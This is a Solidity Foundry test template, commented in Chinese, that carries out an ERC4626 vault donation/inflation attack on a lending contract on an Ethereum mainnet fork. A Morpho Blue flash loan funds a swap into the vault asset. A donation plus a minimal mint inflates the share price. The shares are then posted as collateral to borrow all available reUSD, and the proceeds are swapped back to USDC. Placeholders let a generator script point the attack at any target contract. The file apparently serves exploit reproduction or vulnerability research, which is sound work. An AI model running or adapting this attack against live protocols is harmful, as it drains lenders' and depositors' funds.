// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// ERC4626 Vault Donation/Inflation Attack - CACD Token 专用模板
//
// 与 crvUSD 模板的主要区别：
//   1. _swapUsdcForAsset: USDC → CACD token（通过 inputData API calldata）
//   2. _redeemAndFinalSwap: CACD token → USDC（通过 inputData API calldata）
//   3. 支持 multicall 多跳兑换路径
//
// 占位符（由生成脚本替换）：
//   {{CONTRACT_NAME}}            - Solidity 合约名
//   {{SUSPICIOUS_CONTRACT}}      - 攻击者合约地址（checksummed）
//   {{FORK_BLOCK_NUMBER}}        - fork 区块号
//   {{FLASH_LOAN_AMOUNT}}        - 闪电贷 USDC 金额
//   {{ATTACKER_TRANSFER_AMOUNT}} - donation 金额
//   {{ATTACKER_MINT_AMOUNT}}     - mint shares 数量
//   {{SWAP_USDC_TO_ASSET_TARGET}}    - Step1 swap 目标合约
//   {{SWAP_USDC_TO_ASSET_CALLDATA}}  - Step1 swap calldata
//   {{SWAP_ASSET_TO_USDC_TARGET}}    - Step4 swap 目标合约
//   {{SWAP_ASSET_TO_USDC_CALLDATA}}  - Step4 swap calldata
//   {{SWAP_REUSD_TO_ASSET_TARGET}}   - Step3 reUSD→asset swap 目标合约
//   {{SWAP_REUSD_TO_ASSET_CALLDATA}} - Step3 reUSD→asset swap calldata
// ===========================================================================

import "../basetest.sol";

// ---------------------------------------------------------------------------
// 接口定义
// ---------------------------------------------------------------------------

interface IERC20Gen {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function decimals() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IERC4626Gen is IERC20Gen {
    function mint(uint256 shares) external;
    function redeem(uint256 shares, address receiver, address owner) external;
    function controller() external view returns (address);
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

interface IVulnerableContractGen {
    function addCollateralVault(uint256 shares, address receiver) external;
    function borrow(uint256 amount, uint256 minAmount, address receiver) external;
    function collateral() external view returns (address);
    function totalDebtAvailable() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
}

interface IMorphoBlueGen {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

// ---------------------------------------------------------------------------
// 合约主体
// ---------------------------------------------------------------------------

contract {{CONTRACT_NAME}} is BaseTestWithBalanceLog {
    // === 固定地址（Ethereum Mainnet）===
    IERC20Gen private constant usdc = IERC20Gen(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Gen private constant reUsd = IERC20Gen(0x57aB1E0003F623289CD798B1824Be09a793e4Bec);
    IMorphoBlueGen private constant morphoBlue = IMorphoBlueGen(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    // === 参数化地址（由模板引擎注入）===
    IVulnerableContractGen private constant suspiciousVulnerableContract =
        IVulnerableContractGen({{SUSPICIOUS_CONTRACT}});

    // === 动态解析（setUp 时从 VulnerableContract 查询）===
    IERC20Gen private vaultAsset;
    IERC4626Gen private erc4626vault;
    address private assetController;

    // === 攻击参数（由模板引擎注入）===
    uint256 private constant forkBlockNumber = {{FORK_BLOCK_NUMBER}};
    uint256 private constant flashLoanAmount = {{FLASH_LOAN_AMOUNT}};
    uint256 private constant attackerTransferAmount = {{ATTACKER_TRANSFER_AMOUNT}};
    uint256 private constant attackerMintAmount = {{ATTACKER_MINT_AMOUNT}};

    // 借贷金额（运行时确定）
    uint256 private borrowAmount;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", forkBlockNumber);
        fundingToken = address(usdc);

        // 从攻击合约动态查询 Vault 和资产地址
        erc4626vault = IERC4626Gen(suspiciousVulnerableContract.collateral());
        assetController = erc4626vault.controller();
        vaultAsset = IERC20Gen(erc4626vault.asset());
    }

    function testExploit() public balanceLog {
        usdc.approve(address(morphoBlue), type(uint256).max);
        morphoBlue.flashLoan(address(usdc), flashLoanAmount, hex"");
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(morphoBlue), "Caller is not MorphoBlue");
        _swapUsdcForAsset();
        _manipulateOracle();
        _borrowAndSwapReUSD();
        _redeemAndFinalSwap();
    }

    /// @dev Step 1: USDC → CACD token（通过 inputData API 生成的 calldata）
    function _swapUsdcForAsset() internal {
        address target = {{SWAP_USDC_TO_ASSET_TARGET}};
        usdc.approve(target, type(uint256).max);
        string memory inputData = "{{SWAP_USDC_TO_ASSET_CALLDATA}}";
        bytes memory data = vm.parseBytes(inputData);
        (bool ok,) = target.call(data);
        require(ok, "USDC->Asset swap failed");
    }

    /// @dev Step 2: 操纵 oracle：donation + mint 1 share 抬高 pricePerShare
    function _manipulateOracle() internal {
        vaultAsset.transfer(assetController, attackerTransferAmount);
        vaultAsset.approve(address(erc4626vault), type(uint256).max);
        erc4626vault.mint(attackerMintAmount);
    }

    /// @dev Step 3: 抵押 share 借出全部 reUSD，再换成 asset
    function _borrowAndSwapReUSD() internal {
        erc4626vault.approve(address(suspiciousVulnerableContract), type(uint256).max);
        suspiciousVulnerableContract.addCollateralVault(attackerMintAmount, address(this));
        borrowAmount = suspiciousVulnerableContract.totalDebtAvailable();
        suspiciousVulnerableContract.borrow(borrowAmount, 0, address(this));

        // reUSD → asset（通过 inputData API calldata）
        address reusdTarget = {{SWAP_REUSD_TO_ASSET_TARGET}};
        reUsd.approve(reusdTarget, type(uint256).max);
        string memory reusdInputData = "{{SWAP_REUSD_TO_ASSET_CALLDATA}}";
        bytes memory reusdData = vm.parseBytes(reusdInputData);
        (bool ok2,) = reusdTarget.call(reusdData);
        require(ok2, "reUSD->Asset swap failed");
    }

    /// @dev Step 4: 赎回 vault shares，将全部 asset 换回 USDC
    function _redeemAndFinalSwap() internal {
        // 如果持有 vault 的额外 shares，赎回它们
        uint256 vaultBalance = erc4626vault.balanceOf(address(this));
        if (vaultBalance > 0) {
            erc4626vault.redeem(vaultBalance, address(this), address(this));
        }
        // asset → USDC
        uint256 assetBalance = vaultAsset.balanceOf(address(this));
        address target = {{SWAP_ASSET_TO_USDC_TARGET}};
        vaultAsset.approve(target, assetBalance);
        string memory inputData = "{{SWAP_ASSET_TO_USDC_CALLDATA}}";
        bytes memory data = vm.parseBytes(inputData);
        (bool ok,) = target.call(data);
        require(ok, "Asset->USDC swap failed");
    }
}
